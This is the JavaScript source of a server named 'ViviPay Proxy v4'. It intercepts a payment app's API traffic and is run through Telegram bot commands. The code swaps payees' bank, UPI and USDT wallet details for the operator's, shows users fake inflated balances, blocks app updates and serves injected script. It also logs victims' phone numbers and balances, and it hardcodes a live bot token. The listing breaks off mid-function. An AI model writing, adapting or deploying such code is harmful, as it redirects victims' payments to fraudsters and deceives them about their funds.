const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

const app = express();
const TIVOX_API = 'https://tivox.icu';
const REAL_API = 'https://qonix.click';
const PROXY_HOST = 'rtyhh.vercel.app';
const BOT_TOKEN = '8537838501:AAFYQV9aDYaOV_JWvwksPMdyY1IXpY34Qqg';
const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_OVERRIDE = 'https://t.me/Vivipaymed';

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  suspendedPhones: {},
  blockUpdate: true,
  orderBankMap: {}
};

let bot = null;
let webhookSet = false;
const _balSnapTimes = {};
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
const tokenUserMap = {};
const ipUserMap = {};

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('vivipayData');
    if (raw) {
      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else { cachedData = { ...DEFAULT_DATA }; }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) { console.error('Redis load error:', e.message); }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('vivipayData');
      if (current && typeof current === 'object') {
        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
        for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
        if (current.userOverrides) data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
        if (current.orderBankMap) data.orderBankMap = JSON.parse(JSON.stringify(current.orderBankMap));
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('vivipayData', data);
  } catch(e) { cachedData = data; cacheTime = Date.now(); }
}

function getActiveBank(data, userId) {
  const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

async function notifyAdmin(data, msg) {
  if (data.adminChatId && bot) {
    try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch(e) {}
  }
}

function findNumericId(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 5) return '';
  if (Array.isArray(obj)) return '';
  const idFields = ['teamWorkId', 'userId', 'uid', 'id', 'memberId', 'memberCodeId', 'channelUid', 'user_id', 'userid', 'account_id', 'accountId', 'customerId'];
  for (const f of idFields) {
    if (obj[f] !== undefined && obj[f] !== null && obj[f] !== '') {
      const val = String(obj[f]);
      if (/^\d+$/.test(val) && val.length >= 3) return val;
    }
  }
  for (const key of Object.keys(obj)) {
    if (typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
      const found = findNumericId(obj[key], depth + 1);
      if (found) return found;
    }
  }
  return '';
}

function getTokenFromReq(req) {
  const auth = req.headers['authorization'] || req.headers['token'] || req.headers['x-token'] || req.headers['access-token'] || '';
  if (auth.startsWith('Bearer ')) return auth.substring(7).trim();
  if (auth) return auth.trim();
  const ck = req.headers['cookie'] || '';
  const tm = ck.match(/token=([^;]+)/);
  if (tm) return tm[1].trim();
  return '';
}

function getClientIP(req) {
  return req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || req.headers['x-real-ip'] || '';
}

async function resolveUserId(req) {
  const tok = getTokenFromReq(req);
  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
  const ip = getClientIP(req);
  if (ip && ipUserMap[ip]) return ipUserMap[ip];
  try {
    const data = await loadData();
    if (data.tokenMap) {
      if (tok && data.tokenMap[tok]) {
        tokenUserMap[tok] = data.tokenMap[tok];
        return data.tokenMap[tok];
      }
      if (ip && data.tokenMap['ip_' + ip]) {
        ipUserMap[ip] = data.tokenMap['ip_' + ip];
        return data.tokenMap['ip_' + ip];
      }
    }
  } catch(e) {}
  return '';
}

async function saveUserMapping(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  if (tok) tokenUserMap[tok] = String(userId);
  const ip = getClientIP(req);
  if (ip) ipUserMap[ip] = String(userId);
  try {
    const data = await loadData();
    if (!data.tokenMap) data.tokenMap = {};
    let changed = false;
    if (tok && data.tokenMap[tok] !== String(userId)) { data.tokenMap[tok] = String(userId); changed = true; }
    if (ip && data.tokenMap['ip_' + ip] !== String(userId)) { data.tokenMap['ip_' + ip] = String(userId); changed = true; }
    if (changed) await saveData(data);
  } catch(e) {}
}

function parseMultipartFields(rawBody) {
  if (!rawBody || rawBody.length === 0) return {};
  const bodyStr = rawBody.toString();
  const fields = {};
  const matches = bodyStr.matchAll(/name="([^"]+)"\r?\n\r?\n([^\r\n-]+)/g);
  for (const m of matches) {
    fields[m[1]] = m[2].trim();
  }
  return fields;
}

const BANK_FIELD_MAP = {
  accountno:'accountNo',accountnumber:'accountNo',account_no:'accountNo',
  receiveaccountno:'accountNo',bankaccount:'accountNo',bankaccountno:'accountNo',
  payeeaccount:'accountNo',cardno:'accountNo',cardnumber:'accountNo',
  bankcardno:'accountNo',payeecardno:'accountNo',receivecardno:'accountNo',
  payeebankaccount:'accountNo',payeebankaccountno:'accountNo',payeeaccountno:'accountNo',
  receiveraccount:'accountNo',receiveraccountno:'accountNo',
  walletaccount:'accountNo',walletno:'accountNo',collectionaccount:'accountNo',
  collectionaccountno:'accountNo',customerbanknumber:'accountNo',
  customerbankaccount:'accountNo',accno:'accountNo',acc_no:'accountNo',
  account:'accountNo',receiveaccount:'accountNo',
  beneficiaryname:'accountHolder',accountname:'accountHolder',account_name:'accountHolder',
  receiveaccountname:'accountHolder',holdername:'accountHolder',accountholder:'accountHolder',
  bankaccountholder:'accountHolder',receivename:'accountHolder',
  payeename:'accountHolder',bankaccountname:'accountHolder',realname:'accountHolder',
  cardholder:'accountHolder',cardname:'accountHolder',receivername:'accountHolder',
  collectionname:'accountHolder',customername:'accountHolder',accname:'accountHolder',
  acc_name:'accountHolder',truename:'accountHolder',receiverealname:'accountHolder',
  payeerealname:'accountHolder',
  ifsc:'ifsc',ifsccode:'ifsc',ifsc_code:'ifsc',receiveifsc:'ifsc',
  bankifsc:'ifsc',payeeifsc:'ifsc',receiverifsc:'ifsc',collectionifsc:'ifsc',
  bankname:'bankName',bank_name:'bankName',payeebankname:'bankName',receiverbankname:'bankName',
  upiid:'upiId',upi_id:'upiId',upi:'upiId',vpa:'upiId',
  payeeupi:'upiId',receiverupi:'upiId',walletupi:'upiId',
  payeebankaccount:'accountNo',payeerecipientsname:'accountHolder',
  payeerecipientsname:'accountHolder',payeerecipientname:'accountHolder',
  recipientsname:'accountHolder',recipientname:'accountHolder',
  payeebankname:'bankName',payerbankname:'bankName'
};

function scanHasBankFields(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return false;
  if (Array.isArray(obj)) { return obj.some(item => scanHasBankFields(item, depth + 1)); }
  for (const k of Object.keys(obj)) {
    const kl = k.toLowerCase().replace(/[_-]/g, '');
    if (BANK_FIELD_MAP[kl] === 'accountNo' || BANK_FIELD_MAP[kl] === 'ifsc') return true;
    if (typeof obj[k] === 'object' && scanHasBankFields(obj[k], depth + 1)) return true;
  }
  return false;
}

const NAME_FIELDS = ['name','payname','username','ctname','holdername','ownername',
  'receivename','payeename','beneficiaryname','accountname','realname',
  'cardholder','cardname','receivername','collectionname','customername',
  'truename','accname','bankaccountname','receiveaccountname',
  'payeerealname','receiverealname','bankaccountholder','accountholder'];

function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1, globalHasAcct); return; }
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct); continue; }
    if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
    const kl = k.toLowerCase().replace(/[_-]/g, '');
    const mapping = BANK_FIELD_MAP[kl];
    if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
    if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
    if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; }
  }
}

const BALANCE_KEYS = ['balance','userbalance','availablebalance','totalbalance','money',
  'itoken','itokenbalance','tokenbalance','usermoney','memberbalance',
  'mybalance','walletbalance','accountbalance','rechargebalance','coinbalance',
  'totalmoney','totalamount','membermoney','useritoken','myitoken','mytokenbalance'];

function addBalanceToFields(obj, bonus, depth) {
  if (!obj || typeof obj !== 'object' || !bonus || depth > 10) return;
  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) if (typeof obj[i] === 'object') addBalanceToFields(obj[i], bonus, depth + 1); return; }
  for (const k of Object.keys(obj)) {
    const kl = k.toLowerCase();
    if (BALANCE_KEYS.includes(kl)) {
      const v = parseFloat(obj[k]);
      if (!isNaN(v) && v >= 0) {
        obj[k] = typeof obj[k] === 'string' ? String((v + bonus).toFixed(2)) : parseFloat((v + bonus).toFixed(2));
      }
    }
    if (typeof obj[k] === 'object' && obj[k] !== null) addBalanceToFields(obj[k], bonus, depth + 1);
  }
}

function findBalanceDeep(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 6) return null;
  const balKeys = ['iToken','itoken','balance','userBalance','availableBalance','totalBalance',
    'money','tokenBalance','usermoney','memberBalance','myBalance','itokenBalance','iTokenBalance',
    'userMoney','coinBalance','walletBalance'];
  for (const bk of balKeys) {
    if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
      const v = parseFloat(obj[bk]);
      if (!isNaN(v)) return { field: bk, value: v };
    }
  }
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) {
      const f = findBalanceDeep(obj[k], depth + 1);
      if (f) return f;
    }
  }
  return null;
}

function replaceUsdtAddress(obj, newAddr, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) replaceUsdtAddress(obj[i], newAddr, depth + 1); return; }
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === 'string' && /^T[A-Za-z1-9]{33}$/.test(obj[k])) {
      obj[k] = newAddr;
    } else if (typeof obj[k] === 'object') {
      replaceUsdtAddress(obj[k], newAddr, depth + 1);
    }
  }
}

app.use((req, res, next) => {
  if (req.method === 'GET' || req.method === 'HEAD') return next();
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.body = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.body = Object.fromEntries(params);
      } else {
        req.body = {};
      }
    } catch(e) { req.body = {}; }
    next();
  });
});

app.use('/hook', (req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.get('/inject.js', async (req, res) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Access-Control-Allow-Origin', '*');
  try {
    const data = await loadData();
    const initCfg = {
      tg: TELEGRAM_OVERRIDE,
      blockUpdate: data.blockUpdate !== false
    };
    const jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
    res.send(jsCode);
  } catch(e) {
    res.send(INJECT_JS);
  }
});

app.get('/hook/config', async (req, res) => {
  try {
    const data = await loadData();
    const userId = req.query.userId || '';
    const bank = getActiveBank(data, userId);
    const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
    const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
    const globalBonus = data.depositBonus || 0;
    const totalBonus = addedBal + globalBonus;
    const suspended = [];
    if (data.suspendedPhones) {
      for (const p of Object.keys(data.suspendedPhones)) suspended.push(p);
    }
    const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
    const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
    const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
    res.json({
      enabled: data.botEnabled !== false,
      an: bank ? bank.accountNo : '',
      ah: bank ? bank.accountHolder : '',
      if: bank ? bank.ifsc : '',
      bn: bank ? (bank.bankName || '') : '',
      ui: bank ? (bank.upiId || '') : '',
      tg: TELEGRAM_OVERRIDE,
      bonus: totalBonus,
      bal: shownBal,
      blockUpdate: data.blockUpdate !== false,
      usdtAddr: data.usdtAddress || '',
      suspended: suspended
    });
  } catch(e) {
    res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
  }
});

app.post('/hook/log', async (req, res) => {
  res.json({ ok: true });
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const data = await loadData(true);
  const bank = getActiveBank(data, null);
  let redisOk = false;
  if (redis) { try { await redis.ping(); redisOk = true; } catch(e) {} }
  res.json({
    status: 'ok', app: 'ViviPay Proxy v4 (server-side)',
    redis: redis ? (redisOk ? 'connected' : 'error') : 'not configured',
    bankActive: !!bank, totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    trackedUsers: Object.keys(data.trackedUsers || {}).length,
    approach: 'Server-side proxy — all /xxapi/* routes intercepted'
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.body?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 ViviPay Proxy Controller v4
(Server-Side Proxy Mode)

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate
/log — Toggle request logging
/update — Toggle update block
/status — Full status

=== BALANCE ===
/add <amount> <userId>
/deduct <amount> <userId>
/remove balance <userId>
/history — Balance history
/clearhistory — Clear history

=== USDT ===
/usdt <address> — Set USDT
/usdt off — Disable

=== SUSPEND ===
/suspend <phone>
/unsuspend <phone>
/suspended — List all

=== SELL ===
/control sell <userId>
/sell history

=== TRACKING ===
/idtrack — All tracked users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      let m = `📊 ViviPay Status (v4 Server-Side):\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF'); return res.sendStatus(200); }
    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

    if (text === '/update' || text === '/update off' || text === '/update on') {
      if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, data.blockUpdate ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
      data.balanceHistory.push({ type: 'add', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: (tracked && tracked.phone) || '' });
      data._skipOverrideMerge = true; await saveData(data);
      const statusMsg = tracked ? `📊 Balance: ₹${tracked.balance || 'N/A'}` : `⏳ User is offline — ₹${data.userOverrides[targetUserId].addedBalance} will show when they open the app`;
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({ type: 'deduct', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total: ₹${data.userOverrides[targetUserId].addedBalance || 0}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId]) {
        const removed = data.userOverrides[targetId].addedBalance || 0;
        delete data.userOverrides[targetId].addedBalance;
        data._skipOverrideMerge = true; await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}`);
      } else { await bot.sendMessage(chatId, `ℹ️ No fake balance for ${targetId}`); }
      return res.sendStatus(200);
    }

    if (text.startsWith('/control sell ')) {
      const sid = text.substring(14).trim();
      if (!sid) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[sid]) data.userOverrides[sid] = {};
      data.userOverrides[sid].sellControl = !data.userOverrides[sid].sellControl;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🔒 Sell Control ${data.userOverrides[sid].sellControl ? '🟢 ON' : '🔴 OFF'} for ${sid}`);
      return res.sendStatus(200);
    }

    if (text === '/sell history' || text.startsWith('/sell history ')) {
      const target = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
      const sh = data.sellHistory || [];
      const filtered = target ? sh.filter(h => String(h.userId) === target) : sh;
      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No sell history.'); return res.sendStatus(200); }
      let msg = '🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n';
      for (const h of filtered.slice(-10)) msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const ht = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      const filtered = ht ? history.filter(h => h.userId === ht) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No history.'); return res.sendStatus(200); }
      let m = '📊 Balance History:\n\n';
      for (const h of filtered.slice(-20)) {
        m += `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → ${h.userId}${h.phone ? ' (' + h.phone + ')' : ''} | ${h.time}\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data.balanceHistory = []; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, '🗑 History cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked.'); return res.sendStatus(200); }
      let m = '📋 Tracked Users:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const addedBal = data.userOverrides && data.userOverrides[uid] && data.userOverrides[uid].addedBalance ? ` (+₹${data.userOverrides[uid].addedBalance})` : '';
        m += `👤 ID: ${uid}\n`;
        if (u.name) m += `   📛 ${u.name}\n`;
        if (u.phone) m += `   📱 ${u.phone}\n`;
        if (u.balance) m += `   💰 ₹${u.balance}${addedBal}\n`;
        m += `   🕐 ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks.'); return res.sendStatus(200); }
      await bot.sendMessage(chatId, '💳 Banks:\n\n' + bankListText(data));
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI'); return res.sendStatus(200); }
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const nb = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(nb);
      if (data.activeIndex < 0) data.activeIndex = 0;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${nb.accountHolder} | ${nb.accountNo}\nIFSC: ${nb.ifsc}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      data.activeIndex = idx; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Active bank: #${idx + 1}\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      if (addr.toLowerCase() === 'off') { data.usdtAddress = ''; } else if (addr.length >= 20) { data.usdtAddress = addr; }
      else { await bot.sendMessage(chatId, '❌ Invalid address.'); return res.sendStatus(200); }
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, data.usdtAddress ? `₮ USDT: ${data.usdtAddress}` : '❌ USDT override OFF');
      return res.sendStatus(200);
    }

    if (text.startsWith('/suspend ')) {
      const sp = text.substring(9).trim();
      if (!data.suspendedPhones) data.suspendedPhones = {};
      data.suspendedPhones[sp] = { time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🚫 Suspended: ${sp}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/unsuspend ')) {
      const up = text.substring(11).trim();
      if (data.suspendedPhones && data.suspendedPhones[up]) { delete data.suspendedPhones[up]; data._skipOverrideMerge = true; await saveData(data); }
      await bot.sendMessage(chatId, `✅ Unsuspended: ${up}`);
      return res.sendStatus(200);
    }

    if (text === '/suspended') {
      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended.'); return res.sendStatus(200); }
      let msg = '🚫 Suspended:\n';
      for (const p of phones) msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

async function proxyToTivox(req) {
  const path = req.originalUrl || req.url;
  const url = TIVOX_API + path;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'tivox.icu';
